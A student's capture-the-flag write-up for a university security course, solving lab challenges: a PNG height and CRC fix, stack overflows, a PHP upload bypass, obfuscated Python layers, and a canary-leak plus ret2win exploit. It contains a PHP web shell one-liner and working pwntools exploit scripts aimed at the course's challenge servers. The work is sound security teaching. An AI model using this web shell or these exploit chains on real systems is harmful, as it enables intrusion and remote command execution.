# E. 1 Duck

```
file duck.png           
duck.png: PNG image data, 1205 x 200, 8-bit/color RGB, non-interlaced
```
width: 1205
height: 200

PNG file structure
![](../Assets/Screenshot%202025-10-31%20at%207.57.42%20PM.png)


file in hex
![](../Assets/Screenshot%202025-10-31%20at%207.55.37%20PM.png)
current height = 0xc8 = 200
According to question, need to double the height
400 in hex -> 0x190 

change `00 00 00 C8` to `00 00 01 90`

![](../Assets/Screenshot%202025-10-31%20at%207.56.49%20PM.png)

But after modifying the height, i tried opening the file but it says that the CRC in iHDR is invalid. Likely because when we modified the height, the CRC checksum became invalid. So we need to recalculate the CRC checksum. 

```
pngcheck duck.png
duck.png  CRC error in chunk IHDR (computed d7fec54d, expected 01047687)
ERROR: duck.png
```

changed the CRC from `01047687` to `d7fec54d`

![](../Assets/Screenshot%202025-10-31%20at%208.46.53%20PM.png)

Wait, the flag is still not there and the picture still seems to be cut in half so im going to try to double it again. 

New Height -> 0x320 
New CRC -> 0x5aabc711


![](../Assets/Screenshot%202025-10-31%20at%208.49.14%20PM.png)
YAY seeing the flag now epic

# E.2 Bad Stack 

inspect the vuln() function
```c
int vuln() {
    char secret[0x10] = "[REDACTED]";
    char buf[0x20] = "";
    printf("Welcome to the bad stack, what would you like to input today?\n");
    printf("Input whatever:\n");
    gets(buf); // why does my compiler give me a warning...?   
    if (!strncmp(buf, secret, 0x10)) {
        printf("You found the secret activation!\n");
        printf("Fine, here's the flag...\n");
        win();
        exit(0);
    }
    printf("Echo: %s", buf);
}
```
It uses gets() function which is vulnerable to stack overflow which is very obvious when u read the man file of gets()

![](../Assets/Screenshot%202025-10-31%20at%208.54.20%20PM.png)

So here, we can overflow the 0x20 of buffer and move up the stack into the secret function

Then the program compares the first 0x10 of buf and secret, and if they match, the if block will be executed and then we can get to the win() function. So we can just overflow them all with "A"s so then buff will be the same as secret

![](../Assets/Screenshot%202025-10-31%20at%209.05.45%20PM.png)
# E. 3 Self-made NextCloud
```php
if(isset($_POST["submit"])) {
    $original_filename = basename($_FILES["fileToUpload"]["name"]);
    $target_file = $target_dir . $original_filename;
    
    // Get the file extension - VULNERABLE: only checks the last extension
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
    
    // Check if file is an actual image or fake image
    // VULNERABLE: This check can be bypassed
    if(isset($_POST["submit"])) {
        $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
        if($check !== false) {
            // It's an image
            $uploadOk = 1;
        } else {
            // Not detected as an image, but we'll still allow it if extension is correct
            $uploadOk = 1;
        }
    }
```

There are 2 vulnerabilities here: 
1. Only checks the last extension - Thus we can bypass by using multiple extensions like `.php.png`
2. It doesn't check whether its an actual image or fake image because they assume that the extension check is correct.

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php.png
```

Upload the file 
![](../Assets/Screenshot%202025-10-31%20at%209.27.06%20PM.png)

```
http://cs2107-ctfd-i.comp.nus.edu.sg:5002/uploads/6904bab5c3cc9_shell.php.png?cmd=pwd
```
this shows the current directory it is in

Changing the `cmd=..` to whatever cmd you want to run like `ls .` that shows a list of files in the current directory. Found `flag.txt` in the directory. Cat the file

```
http://cs2107-ctfd-i.comp.nus.edu.sg:5002/uploads/6904bab5c3cc9_shell.php.png?cmd=cat%20flag.txt
```

![](../Assets/Screenshot%202025-10-31%20at%209.39.10%20PM.png)


# M. 2 Evil Cowsay 
```shell
file evilcowsay
evilcowsay: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2b56c78439b6e3731497bb744934c468ca66498a, for GNU/Linux 3.2.0, not stripped
```

```shell
hnin@ubuntu:~$ checksec evilcowsay
[*] '/home/hnin/evilcowsay'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No win function in source code provided. Dumping that in binary ninja, me finding the win() function. 

![](../Assets/Screenshot%202025-10-31%20at%2010.21.01%20PM.png)

Because there is no PIE, we know that the win() function is at address `0x401209`


```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

![](../Assets/Screenshot%202025-10-31%20at%2010.38.04%20PM.png)

Put that in as the input, it quits with a Segmentation fault. Examining the RIP we get:  **RIP**  0x616161706161616f ('oaaapaaa')

```
>>> offset = cyclic_find(b'oaaa')
>>> print(offset)
56
```
using cyclic, we know the offset has the length of 56 

so we just need to overwrite with 56 of random arbitrary data and then the win address `0x 401209`

```python
from pwn import *


#p = process('./evilcowsay')
p = remote("cs2107-ctfd-i.comp.nus.edu.sg", 5005)
win = 0x00401209
buf_size = 0x38 #56 = 0x38

payload = b'A' * buf_size
payload += p64(win)

p.recvuntil(b"What do you want the evil cow to say?")
p.send(payload)
p.interactive()
```

![](../Assets/Screenshot%202025-10-31%20at%2010.53.35%20PM.png)

# M. 3 Onion-haseyo
Decoded the hex and wrote it to a new file
```python
data = bytes.fromhex('.....')
curr = data.decode("utf-8")
with open("onion-1.py", "w") as file:
    file.write(curr)
```

onion-1.py
```python
data = bytes.fromhex('...')
exec(data.decode("utf-8"))
```
do the same as above and get onion-2.py

onion-2.py
```python
import codecs
exec(codecs.decode('rira = \'vce nr4vce m\\abcrfq=of6.6qpq(DcBSJMJKRH81tNHAL//N//LwhCQ.....\nrkrp(zretrq)\n', "rot_13"))
```

decode that 
```python
import codecs 
decoded = codecs.decode('rira = \'vce nr4vce m\\abcrfq=of6.6qpq(DcBSJMJKRH81tNHAL//N//LwhCQ.....\nrkrp(zretrq)\n', "rot_13")
with open("onion-3.py", "w") as file:
    file.write(decoded)
```

onion-3.py
```python
even = 'ipr ae4ipr....'
odd = "motbs6\...."
merged = ''.join(e + o for e, o in zip(even, odd)) + (even[len(odd):] if len(even) > len(odd) else '')
exec(merged)
```

onion-4.py
```python
import base64
import bz2
compressed = base64.b64decode('QlpoOTFBWS....')
exec(bz2.decompress(compressed).decode("utf-8"))
```
pattern: for every onion, take the last line remove exec() and instead print it out to a new onion python file

onion-5.py
```python
import base64
exec(base64.b64decode('aW1wb3J0IGJhc....'))
```

Too many layers: time to automate this.
```python
import codecs
import sys
import re

def decode_multi_layer(input_file):
    with open(input_file, 'r') as f:
        content = f.read()

    iteration = 0
    current_code = content

    while True:
        iteration += 1
        print(f"\n[Iteration {iteration}]")
        
        # Check if we found the flag 
        if 'CS2107' in current_code:
            print("FLAG FOUND!")
            print(current_code)
            break
        # Replace exec() with a capture mechanism
        # This prevents code execution but allows us to capture what would be executed
        modified_code = current_code.replace('exec(', 'captured_data = (')
        
        try:
            namespace = {'codecs': codecs, 'captured_data': None}
            exec(modified_code, namespace)
            captured = namespace.get('captured_data')
            if captured is None:
                print("No data captured, stopping.")
                print(f"data: {current_code[:500]}")
                break
            if isinstance(captured, bytes):
                current_code = captured.decode('utf-8', errors='ignore')
            else:
                current_code = str(captured)
            print(f"Captured {len(current_code)} characters")
            print(f"Preview: {current_code[:100]}...")
            
        except Exception as e:
            print(f"Error during execution: {e}")
            break

decode_multi_layer('onion-haseyo.py')
```

![](../Assets/Screenshot%202025-11-01%20at%207.37.58%20PM.png)
# H. 2 1337 Admin System 
```shell
file sys
sys: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e758c7a60b7a38aeabbc7056ffc38a7aaba0a9c4, for GNU/Linux 3.2.0, not stripped
```

```
hnin@ubuntu:~$ checksec sys
[*] '/home/hnin/sys'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
everything is pretty much enabled here. tough....

Thankfully, there are two vulnerability in this binary.

The first vulnerability is in the intro function
![](../Assets/Screenshot%202025-11-01%20at%206.10.33%20PM.png)
Because after printing "\nWelcome " it will print the value of `&var_18` but because there is no proper sanitisation, there is a format string vulnerability. A secure version of that should be `printf("\nWelcome %s", &var_18)`. This vulnerability will be useful in defeating canary, by leaking out the canary so when we overwrite it it will still be correct.

Now we need to find where the canary is in the stack at the point of time. In gdb-pwndbg, set a breakpoint before fgets (intro + 103)

use the canary command
![](../Assets/Screenshot%202025-11-01%20at%206.46.00%20PM.png)
we know that the canary is 8th from the top of the stack. But they start counting at 0 so we can leak it by using "%7$p"

we can confirm this by running it again
![](../Assets/Screenshot%202025-11-01%20at%207.23.19%20PM.png)

The second vulnerability is in the echo function
![](../Assets/Screenshot%202025-11-01%20at%205.46.41%20PM.png)
The vulnerability lies here where the buffer is 0x38 but the input allowed is of size 0x300 so there will be a buffer overflow. 

we need to know where the canary is in stack in the echo() function after fgets in order to know where to put it back in when we overwrite

set a breakpoint at `echo + 93`

```
pwndbg> canary
Thread 1: Found valid canaries.
00:0000│  0x7fffffffd0d0 ◂— 0xa40f14ac7d71cb00
Additional results hidden. Use --all to see them.
pwndbg> x/100x $rsp
0x7fffffffe150:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe160:	0x0a414141	0x00000000	0x00000000	0x00000000
0x7fffffffe170:	0x55557d70	0x00005555	0xf7ffd000	0x00007fff
0x7fffffffe180:	0xffffe190	0x00007fff	0x7d71cb00	0xa40f14ac
```
We know the canary is at offset of 56 bytes

There is a win() function so we must RET2WIN.
![](../Assets/Screenshot%202025-11-01%20at%205.47.57%20PM.png)

when u want to see the status, it does a little password checking. Password == `0xdeadbeef`
![](../Assets/Screenshot%202025-11-01%20at%206.08.26%20PM.png)
This little function is nice because if we get the correct password we are able to get the address of the main function and defeat PIE.

The grand plan:
1. In the intro, when they ask for name 
	1. key in `%7$p` to get the stack canary
2. Press "1" to check system status and get the address of main function
	1. Put in `0xdeadbeef` as password 
3. Calculate the address of win function
	1. offset of win function from main function: 0x4012bc - 0x40171f = -0x463
4. Press "2" to secret echo chamber
	1.  put in `b'A' * 56`
	2. put the canary we found in step 1 
	3. address of win

```python
from pwn import *

binary = './sys'
context.binary = ELF(binary)
context.log_level = 'info'
#p = process(binary)
p = remote('cs2107-ctfd-i.comp.nus.edu.sg', 5006)


p.recvuntil(b"Enter your username (7 char max):")
p.sendline(b"%7$p")


p.recvuntil(b"Welcome, ")
canary_leak = p.recvline().strip()
canary = int(canary_leak, 16)
log.success(f"Leaked canary: {hex(canary)}")


p.recvuntil(b"Input:\n")
p.sendline(b"1")

p.recvuntil(b"Input admin password:")
p.sendline(b"\xef\xbe\xad\xde") 

p.recvuntil(b"main is at: ")
main_leak = p.recvline().strip()
main_addr = int(main_leak, 16)
log.success(f"Leaked main: {hex(main_addr)}")

win_offset = -0x463
win_addr = main_addr + win_offset
log.success(f"Calculated win address: {hex(win_addr)}")

p.recvuntil(b"Input:\n")
p.sendline(b"2") 

p.recvuntil(b"Say something and I will echo :)\n")

payload = b'A' * 56          
payload += p64(canary)   
payload += p64(0)         
payload += p64(win_addr)   

p.sendline(payload)

p.interactive()
```